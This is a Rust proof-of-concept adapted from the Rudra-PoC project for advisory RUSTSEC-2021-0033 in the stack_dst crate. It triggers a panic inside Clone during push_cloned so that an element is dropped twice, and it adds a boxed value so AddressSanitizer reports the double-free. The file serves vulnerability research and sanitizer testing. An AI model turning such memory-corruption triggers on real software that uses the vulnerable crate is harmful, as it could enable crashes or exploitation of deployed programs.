//! Mechanical payload-strengthening adapter for Rudra-PoC 0150.
//!
//! Origin: Rudra-PoC commit 6226dd030fffbed5601099cb0e24f73e4150a7f5,
//! `poc/0150-stack_dst.rs` (RUSTSEC-2021-0033). Adding a `Box<u64>`
//! to the original logging payload preserves the panic path and turns the
//! duplicate drop into an allocator-visible AddressSanitizer double-free.

#![forbid(unsafe_code)]

use stack_dst::StackA;

#[derive(Debug)]
struct DropDetector(u32, #[allow(dead_code)] Box<u64>);

impl Drop for DropDetector {
    fn drop(&mut self) {
        eprintln!("Dropping {}", self.0);
    }
}

impl Clone for DropDetector {
    fn clone(&self) -> Self {
        panic!("panic in clone")
    }
}

fn main() {
    let mut stack = StackA::<[DropDetector], [usize; 9]>::new();
    stack
        .push_stable([DropDetector(1, Box::new(1))], |value| value)
        .unwrap();
    stack
        .push_stable([DropDetector(2, Box::new(2))], |value| value)
        .unwrap();

    let _second_drop = stack.pop();
    stack.push_cloned(&[DropDetector(3, Box::new(3))]).unwrap();
}
